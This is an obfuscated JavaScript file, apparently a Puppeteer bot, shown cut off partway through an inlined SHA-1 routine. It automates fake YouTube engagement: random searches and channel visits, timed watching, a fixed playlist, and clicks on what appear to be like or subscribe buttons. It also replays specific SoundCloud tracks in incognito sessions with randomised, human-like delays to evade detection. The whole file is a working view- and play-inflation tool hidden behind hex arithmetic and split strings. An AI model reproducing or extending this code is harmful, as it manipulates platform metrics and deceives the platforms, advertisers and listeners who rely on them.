const X = c,
  W = d,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * 0x26a9 + -0x2710 + 0x1 * 0x4dba))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x21ba + -0x2 * -0xdfc + 0x5c2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x4d4b * -0x3 + -0xc59 * -0x9 + 0xedf0 + (0x6589 + -0x2c3f * -0x2 + -0x836f) * random()) : await standardWaitForNetIdle(f), await wait(0x1119 * -0x2 + 0x1 * 0x1693 + 0x1f27 + (-0xcb + 0xf8c + -0x379 * -0x7) * random()), -0x1 * 0x8db + -0x374 + 0x18a * 0x8;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x209 * 0xc + 0x1feb * 0x1 + -0x24cf), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x25 * 0xe9 + -0x1 * -0x138b + 0x39 * -0xef;
}
async function randomWait() {
  return await wait(0x12f5 * -0x1 + 0x2589 + 0x1 * 0xf4 + (0xd * -0x2e1 + -0xba * 0xc + 0x2b * 0x187) * random()), -0x16ed + 0x32 * -0xc8 + 0x3dfe;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1e7 * -0xc + -0x7ba + 0x1e8e, 0x6 * 0x5f7 + -0xb57 * 0x1 + -0xc * 0x209), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1c * 0x989 + 0x10b * 0x10b + -0xdee3 * -0x1) * getRandomInt(-0x8 * -0xef + 0x6c0 + -0xe36, 0x1 * 0xafd + -0x511 * -0x7 + -0x2e6f), h)), -0xaef + -0x11 * 0x2f + 0xe0f;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x2482 + 0x4a * 0x2e + -0x31ce;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x29a + 0xb7f * -0x2 + -0x1465 * -0x1]['split']('\x20');
    for (let k = 0x12d2 + -0x10 * -0xda + 0x2072 * -0x1; k < i['length']; k += 0xd05 * -0x3 + -0x148f + 0x3ba0)
      j += i[k] * h[i[k + (0xcff * -0x1 + 0xeb6 + -0x1b6)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const R = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))[R(0x17)](-0x1191 + 0x988 * 0x2 + -0x179)['map'](l => Array['from'](l['children']))['flat'](-0x273 + -0x2 * 0x85c + 0x132c)['map'](l => l['childNodes'][0xb * -0x11f + 0x1b2c + -0x6 * 0x279]['childNodes'][-0xcd5 * -0x2 + 0xf * 0x119 + -0xf * 0x2cf]['childNodes'][-0x434 + -0x1 * 0x1393 + -0x17c8 * -0x1]['childNodes'][0xaf6 + -0x209f * -0x1 + -0x3 * 0xe87]['childNodes'][-0x2d8 + 0x18ab + 0x1 * -0x15d2]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * -0x193f + -0xe03 * 0x2 + 0x6af, 0x55 + -0x55f + 0x1 * 0x1892)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x19b7 * -0x1 + 0x235 * 0x1d + 0x144e);
  const h = await getMaxTime(f),
    i = Math['min']((0x14 * -0x95a + 0x1773a * -0x1 + 0x31ca2) * getRandomInt(0x1 * 0xc43 + -0x154e + 0x90d, 0x1de2 + -0xb * 0x114 + -0x1201), h);
  return await wait(i), -0x1bed + -0xb34 + 0x2722;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xb * -0x1ff + -0xd1 * -0x2d + 0x3ab2 * -0x1]['children'][-0x154 + 0x584 + -0x430]['children'][-0x475 + 0x31 * 0x7d + -0x1378]['children'][-0x4a9 * -0x2 + 0x2 * -0x83d + -0x394 * -0x2]['children'][-0x4 * -0x16f + -0xea1 + 0x8e5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x87d + 0x168a + -0x13 * 0x1a2;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x843 * 0x1 + -0x2387 + 0x1ba8 + (0xd6 + 0x3 * -0xb6d + 0x6d * 0x4f) * random()
  }), await wait(0x74 * -0x3b + 0x3fc + 0x18b4 + (0x61 * -0x6 + 0x2 * -0xbc9 + 0x214 * 0xd) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x56b + 0x1 * -0xacf + 0x566]['childNodes'][-0x94b + -0xe2b + 0x1777]['childNodes'][-0x2 * -0x527 + -0x3a * 0xa1 + 0x1a2d * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1a03 + 0x200 + -0x1bfe * 0x1]['childNodes'][-0x1bd9 + -0x1e99 + -0x2 * -0x1d39]['childNodes'][0x265 * -0xe + 0xc39 + 0x154f]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x175 * -0xd + 0x1 * -0xa49 + -0x5 * 0x1bb),
          r = -0x1 * 0x1352 + 0x547 + 0xe0b;
        for (let u = -0x2b * 0xe5 + -0xd7b * 0x2 + 0x416d; u < q['length']; u += 0x1 * 0x1a65 + 0xd46 + 0xd * -0x30d)
          r += q[u] * k[q[u + (-0x1729 + 0x48 * -0x32 + -0x129d * -0x2)]];
        return r;
      }(n);
  });
  await wait((0x2930 + 0x52 * 0x6d + 0x36 * -0x53) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x3 * 0x586a + -0x1c59a * 0x1 + -0xa * -0x2a46) * getRandomInt(0x375 * -0xa + 0x1 * -0x31a + 0x25ad, 0x7 * 0x4d5 + -0x1 * 0x11c5 + 0x1 * -0x1004), h + (-0x223b + -0x5 * 0x331 + 0x45b8));
  return await wait(i), -0xddb * -0x1 + -0x87e + -0x55c;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1e13 * -0x1 + 0x2 * 0x308 + 0x1 * -0x2423), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    const S = b;
    log(S(0x10, 'S^sp') + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2 * 0x1013 + -0x1757 * -0x1 + -0x2bc5 + (0x14f3 + -0x1ee7 + 0x4 * 0x377) * Math['random']());
    });
  }, 0x315a + -0x30ac * -0x1 + -0x53 * 0xda);
  await wait(0x17ba * 0x11 + -0x92080 + -0x1e71 * -0x66);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x9400 + 0x1 * -0x287f + 0x1a6df) * getRandomInt(-0x4 * 0x445 + 0x1 * 0x19b7 + -0x89f, -0x17e7 + -0x1321 + 0x2b21)), clearInterval(h), -0x1 * -0x7cd + 0x20e2 + -0x28ae;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1e6a + -0x1ee6 + 0x3d50;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1a8e + -0x108a + -0x1 * 0xa03;
    await randomWait();
  }
  return 0xe5f + 0x388 + -0x1d * 0x9e;
}

function fetchRandomSC() {
  return Math['random']() <= 0xc04 + -0x71b * -0x5 + -0x2f8b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xc18 + -0xd * 0x2f + -0x1 * 0x9b5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bo = [
    'https://gr',
    'DwXSsgvYB19FDa',
    'ts\x20update,',
    'W50bWPSQpfK',
    'inally-met',
    'oSoLWQvtWO4/W4/cRwKS',
    'W68OW4tcIW',
    'rscript,\x20*',
    'D3jPDgu',
    'CM9ZCY1VCMLNAq',
    'rg/scripts',
    'wevgt1jfwxjkzW',
    'https://ww',
    'rg/en/scri',
    '6%9C%AC',
    'WRaxga',
    'W4qyWPnkCSkYW7nCbYW',
    'AwTLieDLy2TVkq',
    'qdwqdwqdwq',
    'ChrZlZqXndC1nG',
    'W7FdGCoPW5XFWR3dK8ktW4Dj',
    'Ahr0Chm6lY9Tzq',
    'zs95B3v0DwjLlG',
    'slice',
    'ew\x20video,b'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xa39 * 0x3 + 0x1 * 0xeae + -0x2d59 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * 0x641 + -0x3b0 + 0x9f1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const T = c;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + T(0x1) + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xac92 + -0x4059 * 0x3 + 0x416b * 0x3 + getRandomInt(0x6021 + -0x4d66 + 0x1 * 0x27dd, -0x16 * -0x4bd + 0x11e2 * 0xd + 0xafa * -0x14));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xadd + -0xe41 + 0x191f), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x3f2 + -0x1 * -0xd3 + 0x31f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1f64 + -0x1df * 0x9 + -0x303b * -0x1, -0x1039 * -0x2 + -0x1 * 0x2543 + 0x503)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x437 + 0x25a8 + -0x220f + floor((-0xf1a * 0x1 + -0x2f9 * -0x6 + -0xf * -0x14) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x54e6 * -0x1fef7 + 0x1a528 * 0x4090 + -0x1a * -0x75af849),
          -0xdb3571 + -0x5c248c + 0x1b759fd,
          -0x7c * 0x43 + 0x4d7e + 0x52f6,
          0x92 * -0x25 + 0x1 * 0x126a + 0x330
        ], y = [
          0x1 * -0x1071 + 0xec4 + -0x97 * -0x3,
          -0x2 * -0x12a4 + -0x43 * 0x6f + -0x82b,
          0x3fb * 0x7 + -0x5bc * 0x1 + 0x1 * -0x1619,
          0x78b * -0x5 + 0x1ad9 + -0x1 * -0xade
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x77d + 0x1a0a + 0x265 * -0xe)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x5 * -0x7a6 + -0x3bf * -0x5 + 0x1383; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1009 + -0x88 * 0x3b + -0xf4f * -0x1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x20b4 + -0x1f * -0xd3 + 0x727] = A[0x549 + -0x468 + -0xd1] = A[-0x5 * -0x26b + 0x8f3 + -0x167 * 0xf] = A[-0x1b * 0x4 + 0x4bb * 0x2 + -0x908] = A[-0x1 * -0x2377 + 0x1 * 0x2011 + -0x5 * 0xd81] = A[0x14db + 0x524 + -0x3 * 0x8a9] = A[0x1 * 0x1b3d + -0x24d5 + 0x99d * 0x1] = A[-0x3 * -0x862 + -0x1 * -0x1454 + -0x2d74] = A[0x2195 + -0x563 + -0x1c2b] = A[0xaf6 * 0x1 + -0x2 * 0x38a + -0x3da] = A[-0x1e0a * -0x1 + 0x38e + -0x218f] = A[-0x7ad + 0x32 * -0x53 + -0x5 * -0x4c9] = A[0x1699 + -0x5 * 0x168 + -0xf86] = A[0x12ea + 0x1450 + -0x3b * 0xaa] = A[0xbc1 * -0x1 + 0x11b6 + 0x4 * -0x17a] = A[0x3 * -0xc25 + 0x2 * -0x417 + 0x2cab] = A[-0x896 + -0x10 * 0x188 + 0x1 * 0x2125] = 0xc87 + 0x635 + -0x4 * 0x4af, this['blocks'] = A) : this['blocks'] = [
                0x31 * -0x11 + -0x4 * 0x58c + 0x1971 * 0x1,
                -0x12c + 0x1 * 0x22ea + -0x21be * 0x1,
                0x1 * 0x51b + -0x7c7 + -0x6 * -0x72,
                -0x101e + -0x183b + 0x3 * 0xd73,
                -0x1 * -0x1217 + -0x5c * 0x3 + -0x1103,
                -0x2379 + 0x1 * -0x211 + 0x258a,
                0xa * -0x8f + 0x1a18 + -0x1482,
                0x1a23 * 0x1 + -0x17 * -0xa9 + -0x2952,
                -0x4 * 0x2f + -0x6ab + 0x767,
                0x158f * 0x1 + 0x966 * 0x1 + -0x1ef5,
                0x176 + 0x238d + -0x17b * 0x19,
                -0x49 * -0x6 + -0x18f0 + 0x3df * 0x6,
                0x2341 * 0x1 + 0x1 * 0xc8c + -0x2fcd,
                0x1751 + -0x191a + 0x1c9,
                -0x381 + 0x899 + -0x4 * 0x146,
                -0x7 * 0x5f + -0x19b4 + 0x17 * 0x13b,
                0x862 + -0x2 * 0x359 + -0x1 * 0x1b0
              ], this['h0'] = 0x61eda9c8 + -0x602dc1b5 + -0x476 * -0x16c1f5, this['h1'] = 0x1835 * 0x31cbd + -0x1602b19c7 + 0x201b * 0x10177d, this['h2'] = 0x3 * 0x2e5eee55 + 0xb88068ac + -0xaae256ad, this['h3'] = -0x6e2 * 0x2e64f + 0x1c3c0b89 + -0x7eb74ab * -0x1, this['h4'] = 0xf27bc819 + -0x77eb4132 + 0x49425b09, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x10c2 + -0x1336 * 0x2 + 0xe * 0x3f1, this['finalized'] = this['hashed'] = 0xc2 * 0x9 + -0x2422 + 0x1d50, this['first'] = 0x1deb + -0xe34 + -0x2 * 0x7db;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1 * -0x7 + 0x1c * -0xe5 + 0x1913, O = J['length'] || 0x209a + 0x16e * 0x15 + 0x1 * -0x3ea0, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x10b4 + -0x1 * 0x6b6 + -0x9fe, P[0x1451 * -0x1 + 0xe05 + 0x193 * 0x4] = this['block'], P[0x63 * -0x16 + -0x7f7 + 0x53 * 0x33] = P[-0x20ad * -0x1 + 0x5bd + -0x2669] = P[-0x6 * -0xbc + -0x5 * -0x9d + 0x27d * -0x3] = P[-0x1 * -0x62b + -0x1410 + 0x164 * 0xa] = P[-0x3 * 0xbfb + -0x1c9d * -0x1 + 0xbc * 0xa] = P[0x1845 + -0x1ca9 + -0x1 * -0x469] = P[-0x2698 + -0xf4b + 0x175 * 0x25] = P[-0xa8 + 0x21b3 + -0x2104] = P[0x1 * 0x20c7 + 0x2605 * 0x1 + 0x2 * -0x2362] = P[-0x35d + 0xf6e + -0xc08] = P[0x1cb2 * -0x1 + -0x12ad + 0x2f69] = P[0x4d * -0x69 + -0x1593 + -0x3533 * -0x1] = P[0x147d * 0x1 + -0x4 * -0x28a + -0x1e99 * 0x1] = P[-0x24ca * 0x1 + -0x758 + 0x2c2f] = P[-0x903 + -0x13f7 + 0x1d08] = P[0xf * -0x16 + -0x1d7 * -0x7 + -0xb88] = 0x237f + 0x874 + 0x1 * -0x2bf3), K) {
                    for (N = this['start']; M < O && N < -0xf13 + 0x3 * -0x2f5 + 0x146 * 0x13; ++M)
                      P[N >> 0x11e1 * 0x1 + -0xd4a + 0x187 * -0x3] |= J[M] << y[0xe7d * -0x1 + -0x4a1 + 0x1321 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x18ad + -0x3e * 0x77 + 0x465; ++M)
                      (L = J['charCodeAt'](M)) < 0x244e + 0x89 * 0xd + -0x2ac3 ? P[N >> 0x1 * 0x109e + 0x3c + -0x10d8] |= L << y[-0x1265 + 0x12c + 0x4 * 0x44f & N++] : L < -0x53c + -0xf * 0x111 + 0x1d3b ? (P[N >> -0xc07 * -0x2 + -0x1dc9 + 0x5bd] |= (0x24b6 + -0x233 + -0x2b * 0xc9 | L >> 0x2 * 0xebf + 0x3 * -0x5 + -0x1 * 0x1d69) << y[0x1f * 0x12b + -0x1 * -0x8b9 + 0xef9 * -0x3 & N++], P[N >> 0x821 * -0x3 + 0x13e2 + 0x4d * 0xf] |= (-0x5c * 0xb + -0x26b * 0x3 + 0xbb5 | -0x116a + 0x1eca * -0x1 + 0x4f * 0x9d & L) << y[0x2009 + 0x61e + -0x2624 & N++]) : L < -0x1 * -0x4872 + 0xd439 + -0x44ab || L >= 0x1b57b + -0xbacb * 0x2 + 0xa01b ? (P[N >> 0x73e + -0x1baf + 0x1473] |= (-0x1466 + 0xb7e * 0x1 + -0x8 * -0x139 | L >> 0x105 + -0x21e9 * -0x1 + -0x22e2) << y[-0x850 + -0x2b * 0xce + 0x2aed & N++], P[N >> 0x15f * -0xd + -0x2419 * -0x1 + -0x29c * 0x7] |= (0x2123 + -0x15ba + -0xae9 | L >> -0x27 * 0xeb + 0x2316 + 0xbd & -0x5 * 0x6d3 + -0x1 * -0x2687 + -0x429) << y[-0xd0f * 0x1 + 0x5ab + 0x767 & N++], P[N >> 0x3fe + -0x10f * -0x4 + -0x838] |= (0x17d * -0x5 + 0x536 * 0x4 + -0xce7 * 0x1 | 0xd49 * -0x1 + -0x1aca * 0x1 + 0x2852 & L) << y[0x26f5 + -0x2547 + -0x1ab & N++]) : (L = -0x1bc37 + 0x2dda + -0x28e5d * -0x1 + ((-0x240b + 0x5 * -0x3fe + 0x78 * 0x80 & L) << -0x82f + 0x4 * 0x9af + -0x1e83 | 0x906 + 0x145b * 0x1 + -0x1962 & J['charCodeAt'](++M)), P[N >> 0x4 * 0x511 + 0x187 * 0x3 + 0x1 * -0x18d7] |= (-0x1d0c + -0x1ae0 + 0x38dc | L >> -0x3c7 * 0x1 + 0xc * -0xf9 + 0xf85) << y[0xffd * -0x1 + 0xd85 + 0x7f * 0x5 & N++], P[N >> 0x13 * 0x57 + 0x61 * -0x43 + -0x12f0 * -0x1] |= (0x12b3 + 0x693 + -0x18c6 | L >> -0x1 * -0x22f7 + -0x59 * 0x1a + 0x1 * -0x19e1 & 0x3 * -0x981 + 0x1122 + 0xba0) << y[0x2214 + -0x523 + -0x1cee & N++], P[N >> -0x1261 + 0x1a31 + -0x7ce] |= (0x97b + -0x206 + -0x6f5 | L >> 0x6c4 + 0xfee + -0x16ac & -0x2680 + -0xf * 0x171 + 0x1e2f * 0x2) << y[-0x1 * -0x2205 + -0x1fae + -0x4 * 0x95 & N++], P[N >> 0x1a * 0xad + -0x53d * 0x3 + -0x1 * 0x1d9] |= (-0x1df1 + 0xe * -0x53 + 0x22fb | -0x1db * 0x11 + 0x15f9 + 0x9d1 & L) << y[0x269f + -0x24 + -0x8 * 0x4cf & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x8e1 + -0x6 * 0x1c1 + 0x27 * 0x81 ? (this['block'] = P[0x10a + -0x1 * -0x7e5 + -0x8df], this['start'] = N - (0x271 * -0x7 + -0xe * -0x2c3 + -0x1553), this['hash'](), this['hashed'] = -0xe23 + -0xa8b + -0x1 * -0x18af) : this['start'] = N;
                }
                return this['bytes'] > 0x277 * 0xb537f5 + 0x1 * -0x1783c1fc3 + -0xb98f32df * -0x1 && (this['hBytes'] += this['bytes'] / (0xa7ecb80c + 0x1010bc694 + -0x18 * 0x70a5a9c) << -0x11bf * -0x2 + -0x1 * -0x59d + -0x291b, this['bytes'] = this['bytes'] % (0xbdda6bac + 0xff824fec + 0x842b * -0x16ec8)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x683 * -0x5 + -0xc2 * 0x2b + 0x8;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xeab + -0x8 * 0x4f + 0xd * -0xef] = this['block'], J[K >> -0x11c8 + 0xc9e + 0x2 * 0x296] |= x[0x1e13 + 0x8 * 0x34b + -0x3868 & K], this['block'] = J[0x1f76 * 0x1 + -0xe3d * 0x1 + 0x1129 * -0x1], K >= -0x22 * 0x124 + -0x35 * -0x71 + 0xf9b && (this['hashed'] || this['hash'](), J[-0x946 * -0x3 + -0x1481 + -0x751 * 0x1] = this['block'], J[-0x4a7 * 0x1 + 0x1f * -0x4f + 0xe48] = J[0x17 * -0x60 + -0x2187 + 0x2a28] = J[0x251 + 0x10e1 + 0x10 * -0x133] = J[0x2491 + 0xe66 + -0x10fc * 0x3] = J[-0x1 * -0xaa3 + -0x418 * 0x9 + 0x3bf * 0x7] = J[0x62b + -0xec5 * -0x2 + -0x23b0] = J[-0x3b * 0x4f + -0xff4 + 0x222f] = J[-0x1 * 0x7fa + -0x54 + 0x855] = J[0x187f * -0x1 + 0x45f * -0x1 + 0x1ce6] = J[-0x145c + 0xe3 * 0x19 + 0x2 * -0xe3] = J[0x720 + -0xcc9 * -0x1 + 0x1 * -0x13df] = J[0x1247 + -0x3 * 0x84f + 0x23b * 0x3] = J[-0x13f3 + 0x59 * 0xb + 0x102c] = J[-0x5b1 * 0x1 + 0x2168 + -0x1baa] = J[0x15 * -0x13c + -0x17 * -0x164 + -0x602] = J[0x30a * -0x1 + -0xd * -0x127 + -0xbe2] = -0x23a + 0x1 * 0x5d9 + -0x39f), J[0xfc0 + 0x92a + 0x4a * -0x56] = this['hBytes'] << 0x11 * -0xe9 + -0x1a2e + -0x2 * -0x14d5 | this['bytes'] >>> 0x261 + 0x17db + -0x1 * 0x1a1f, J[-0x1134 + -0xa * -0x25d + 0xe9 * -0x7] = this['bytes'] << -0x606 + 0x1347 + -0xd3e, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x23e2 * 0x1 + -0x6a7 + -0x1d2b; J < 0x1ab7 + 0x937 + -0x1 * 0x239e; ++J)
                K = Q[J - (0x1953 + -0x762 + -0x11ee)] ^ Q[J - (-0x17f4 + -0x1d87 + 0x3583)] ^ Q[J - (-0x3a7 + 0x1a0c + -0x1657)] ^ Q[J - (-0x5 * -0x743 + 0x4e9 + 0x3 * -0xdb8)], Q[J] = K << -0x5 * 0x1e7 + -0x1fb7 + 0x293b | K >>> 0x1a83 * -0x1 + -0x8f * -0x36 + -0x388 * 0x1;
              for (J = 0xf4f + 0x1435 + -0x2384; J < -0xf * -0xa7 + 0x1 * 0x27b + -0xc30; J += 0xae1 + -0x1c3b + 0x115f)
